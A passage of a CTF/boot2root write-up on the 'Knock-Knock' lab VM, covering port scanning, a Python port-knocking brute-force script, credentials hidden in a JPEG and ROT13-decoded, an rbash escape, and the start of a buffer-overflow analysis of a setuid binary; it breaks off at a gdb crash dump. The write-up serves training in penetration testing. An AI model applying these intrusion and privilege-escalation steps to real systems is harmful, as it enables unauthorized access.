root@kali:~# ping -c 2 192.168.56.203
PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
From 192.168.56.203 icmp_seq=2 Destination Port Unreachable</p>

<p>&mdash;&ndash; 192.168.56.203 ping statistics &mdash;&ndash;
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
```</p>

<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<p>```bash
root@kali:~# nmap -sV &mdash;reason 192.168.56.203 -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 10:03 SAST
Nmap scan report for 192.168.56.203
Host is up, received reset (0.0016s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT     STATE SERVICE REASON  VERSION
1337/tcp open  waste?  syn-ack</p>

<p>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
SF:L,15,&ldquo;[12247,\x202759,\x2026802]\n&rdquo;)%r(GenericLines,15,&ldquo;[37866,\x202
SF:9242,\x203904]\n&rdquo;)%r(GetRequest,15,&ldquo;[29185,\x207368,\x2028937]\n&rdquo;)%r
SF:(HTTPOptions,15,&ldquo;[55772,\x205315,\x2050180]\n&rdquo;)%r(RTSPRequest,13,&ldquo;[9
SF:301,\x2026341,\x20574]\n&rdquo;)%r(RPCCheck,16,&ldquo;[34002,\x2046353,\x2023995\
SF:]\n&rdquo;)%r(DNSVersionBindReq,16,&ldquo;[47043,\x2037532,\x2024012]\n&rdquo;)%r(DNSSt
SF:atusRequest,15,&ldquo;[31914,\x208919,\x2027965]\n&rdquo;)%r(Help,15,&ldquo;[63865,\x2
SF:07077,\x2055801]\n&rdquo;)%r(SSLSessionReq,15,&ldquo;[30406,\x208520,\x2047713]\
SF:n&rdquo;)%r(Kerberos,16,&ldquo;[10459,\x2050977,\x2063996]\n&rdquo;)%r(SMBProgNeg,16,&ldquo;\
SF:[61080,\x2038407,\x2048416]\n&rdquo;)%r(X11Probe,15,&ldquo;[61127,\x2058212,\x203
SF:856]\n&rdquo;)%r(FourOhFourRequest,16,&ldquo;[11007,\x2051452,\x2038765]\n&rdquo;)%r(L
SF:PDString,15,&ldquo;[5738,\x2063719,\x2026394]\n&rdquo;)%r(LDAPBindReq,14,&ldquo;[14292
SF:,\x20937,\x2020668]\n&rdquo;)%r(SIPOptions,16,&ldquo;[33684,\x2058491,\x2031373]
SF:\n&rdquo;)%r(LANDesk-RC,16,&ldquo;[58946,\x2030941,\x2053345]\n&rdquo;)%r(TerminalServe
SF:r,15,&ldquo;[6672,\x2031370,\x2053882]\n&rdquo;)%r(NCP,16,&ldquo;[15356,\x2041972,\x20
SF:52087]\n&rdquo;)%r(NotesRPC,16,&ldquo;[51444,\x2044303,\x2013901]\n&rdquo;)%r(WMSReque
SF:st,13,&ldquo;[87,\x2044952,\x2060309]\n&rdquo;)%r(oracle-tns,15,&ldquo;[51073,\x204686
SF:0,\x206777]\n&rdquo;)%r(afp,16,&ldquo;[30287,\x2064026,\x2029364]\n&rdquo;)%r(kumo-ser
SF:ver,14,&ldquo;[17824,\x2048485,\x20579]\n&rdquo;);</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
```</p>

<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<p>```bash
root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]</p>

<p>root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
```</p>

<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<p>```bash
root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
43059/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
22435/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST
Nmap scan report for 192.168.56.203
Host is up.
PORT      STATE    SERVICE
17432/tcp filtered unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
```</p>

<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<p>```bash</p>

<blockquote><blockquote><blockquote><p>ip=IP(dst=&ldquo;192.168.56.203&rdquo;)
SYN=TCP(dport=40508,flags=&ldquo;S&rdquo;)
send(ip/SYN)
.
Sent 1 packets.</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<p>```bash
root@kali:~# nmap 192.168.56.203</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:40 SAST
Nmap scan report for 192.168.56.203
Host is up (0.00032s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
```</p>

<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import itertools
import sys</p>

<p>destination = &ldquo;192.168.56.203&rdquo;</p>

<p>def clean_up_ports(raw_string):</p>

<pre><code>""" Clean up the raw string received on the socket"""
if len(raw_string) &lt;= 0:
    return None

# Remove the first [
raw_string = raw_string.replace('[','')
# Remove the second ]
raw_string = raw_string.replace(']','')
# split by commas
first_list = raw_string.split(',')

# start e empty return list
ports = []
for port in first_list:
    # strip the whitespace around the string
    # and cast to a integer
    ports.append(int(port.strip()))

return  ports
</code></pre>

<p>def main():</p>

<pre><code>print "[+] Getting sequence"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((destination, 1337))
except Exception as e:
    print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
    sys.exit(1)

# receive the list
raw_list = sock.recv(20)

# get the ports in a actual python list
ports = clean_up_ports(raw_list)

print "[+] Sequence is %s" % ports
print "[+] Knocking on the door using all the possible combinations...\n"

# Lets knock all of the possible combinations of the ports list
for port_list in itertools.permutations(ports):

    print "[+] Knocking with sequence: %s" % (port_list,) 
    for port in port_list:
        print "[+] Knocking on port %s:%s" % (destination,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect_ex((destination, port))
        sock.close()

    print "[+] Finished sequence knock\n"
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>print "[+] Knock knock opener"
main()
print "[+] Done"
</code></pre>

<p>```</p>

<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img class="<a" src="href="https://i.imgur.com/5NdJ65y.png">https://i.imgur.com/5NdJ65y.png</a>"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<p><code>``bash
root@kali:~# wget http://192.168.56.203/knockknock.jpg
--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
Connecting to 192.168.56.203:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 84741 (83K) [image/jpeg]
Saving to:</code>knockknock.jpg'</p>

<p>100%[============>] 84,741      68.2K/s   in 1.2s</p>

<p>2014-10-14 13:04:35 (68.2 KB/s) &ndash; `knockknock.jpg' saved [84741/84741]
```</p>

<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<p><code>bash
root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
ExifTool Version Number         : 8.60
File Name                       : knockknock.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2014:10:06 18:38:30+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Quality                         : 74%
XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
Marked                          : © Estate of Roy Lichtenstein
Web Statement                   : © Estate of Roy Lichtenstein
Rights                          : © Estate of Roy Lichtenstein
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 650
Image Height                    : 788
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 650x788
</code></p>

<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<p>```bash</p>

<h1>extract the jpeg data</h1>

<p>root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture</p>

<h1>the output image from the extract</h1>

<p>root@kali:~# ls image00000.jpg
image00000.jpg</p>

<h1>the cmp</h1>

<p>root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
```</p>

<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<p><code>``bash
root@kali:~# tail -n 1 image00000.jpg
9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9</code>��5BV(��&lt;�t�WS�����1h</p>

<pre><code>                                                     ��\���z$���vB��
</code></pre>

<p>```</p>

<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

<p><code>bash
root@kali:~# tail -n 4 knockknock.jpg
⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
Login Credentials
abfnW
sax2Cw9Ow
</code></p>

<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<p><code>bash
root@kali:~# python -c 'print "abfnW".decode("rot13")'
nosaJ
</code></p>

<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<p><code>bash
root@kali:~# python -c 'print "sax2Cw9Ow".decode("rot13")'
fnk2Pj9Bj
</code></p>

<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<p>```bash</p>

<h1>username</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;abfnW&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1].lower()&rsquo;
jason</p>

<h1>password</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;sax2Cw9Ow&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1]&rsquo;
jB9jP2knf
```</p>

<p>So to get our first shell:</p>

<p>```bash
root@kali:~/Desktop/knock-knock# ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#97;&#x73;&#111;&#x6e;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#54;&#x38;&#x2e;&#53;&#x36;&#46;&#50;&#x30;&#x33;">&#x6a;&#97;&#115;&#x6f;&#110;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#53;&#54;&#x2e;&#x32;&#x30;&#x33;</a>
<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#x6a;&#x61;&#x73;&#x6f;&#x6e;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x35;&#54;&#46;&#x32;&#48;&#51;">&#106;&#x61;&#115;&#x6f;&#x6e;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#53;&#54;&#46;&#x32;&#48;&#51;</a>&rsquo;s password:</p>

<p>Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
```</p>

<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<p><code>bash
jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
</code>
Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

<p>```bash
jason@knockknock:~$ ls -lah
total 32K
drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history &ndash;> /dev/null
-rw-r&mdash;r&mdash; 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r&mdash;r&mdash; 1 jason jason 3.4K Sep 25 21:58 .bashrc
-rw-r&mdash;r&mdash; 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
-rw&mdash;&mdash;&mdash;&ndash; 1 jason jason 2.4K Oct 11 18:42 .viminfo</p>

<p>jason@knockknock:~$ ./tfc</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 

Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc>
jason@knockknock:~$
```</p>

<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<p>```bash</p>

<h1>we have a source document</h1>

<p>jason@knockknock:~$ cat test.tfc
This is a test document.</p>

<h1>we run the encryption program over it</h1>

<p>jason@knockknock:~$ ./tfc test.tfc crypt.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<h1>dump the encrypted file as hex. from the ascii we</h1>

<h1>can see its no longer human readable</h1>

<p>jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..&ldquo;&amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j</p>

<h1>the resulting file is owned by root</h1>

<p>jason@knockknock:~$ ls -l crypt.tfc
-rw-r&mdash;r&mdash; 1 root jason 25 Oct 14 08:12 crypt.tfc
```</p>

<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<p>```bash
jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>jason@knockknock:~$ cat reversed.tfc
This is a test document.
```</p>

<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<p>```bash
jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2</p>

<p>[&hellip; snip &hellip;]</p>

<p>[^_]</p>

<pre><code>Tiny File Crypter - 1.0
</code></pre>

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc></p>

<blockquote><blockquote><p>Filenames need a .tfc extension
No symbolic links!
Failed to open input file
Failed to create the output file
File crypted, goodbye!
;*2$"</p>

<hr />

<p>_<em>    </em><strong>/_   </strong><strong><em>/_   </em></strong> \
  |    |    |    <strong>)  /    \  \/
  |    |    |     \   \     _</strong><em>
  |</em><em><strong>|    _</strong>  /    _</em>____  /</p>

<pre><code>            \/            \/ 
</code></pre>

<p>```</p></blockquote></blockquote>

<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &lt;+0>: push   ebp
   0x08048925 &lt;+1>: mov    ebp,esp</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804894e &lt;+42>:    mov    DWORD PTR [esp],eax
   0x08048951 &lt;+45>:    call   0x80486e6 <cryptFile>    #&lt;&mdash;&ndash;
   0x08048956 &lt;+50>:    test   eax,eax</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804896c &lt;+72>:    ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<p>```bash
gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &lt;+0>: push   ebp
   0x080486e7 &lt;+1>: mov    ebp,esp
   0x080486e9 &lt;+3>: sub    esp,0x1088</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x080488a8 &lt;+450>:   mov    DWORD PTR [esp],eax
   0x080488ab &lt;+453>:   call   0x8048618 <xcrypt>       #&lt;&mdash;&ndash;
   0x080488b0 &lt;+458>:   mov    eax,DWORD PTR [ebp-0x14]</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x08048922 &lt;+572>:   leave<br/>
   0x08048923 &lt;+573>:   ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<p><code>bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></p>

<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<p>```bash</p>

<h1>create a file of roughly 2MB</h1>

<p>root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s</p>

<h1>confirm the size of the file</h1>

<p>root@kali:~# ls -lh large.tfc
-rw-r&mdash;r&mdash; 1 root root 2.0M Oct 14 15:01 large.tfc</p>

<h1>check how many characters we have in the file</h1>

<p>root@kali:~# wc -c large.tfc
2097152 large.tfc</p>

<h1>attempt encryption</h1>

<p>root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
```</p>

<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<p><code>bash
root@kali:~# echo -n $(python -c 'print "A"*6000') &gt; gdb-test.tfc
</code></p>

<p>And continued to run it in <code>gdb</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0xc55193b
ESP: 0xbffff3c0 (&ldquo;<em>dv(\002\250C<sup>z</sup>Ɯ=\214<code>P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\"\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"...)
EIP: 0x675c916
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x675c916
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 ("_dv(\002\250C^zƜ=\214</code>P@JH\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u</em>˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"&hellip;)
0004| 0xbffff3c4 &mdash;> 0x5e43a802
0008| 0xbffff3c8 &mdash;> 0x3d9cc67a
0012| 0xbffff3cc &mdash;> 0x4050608c
0016| 0xbffff3d0 (&ldquo;JH\/Ux7;&lt;\243\211T<em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 &rdquo;&hellip;)
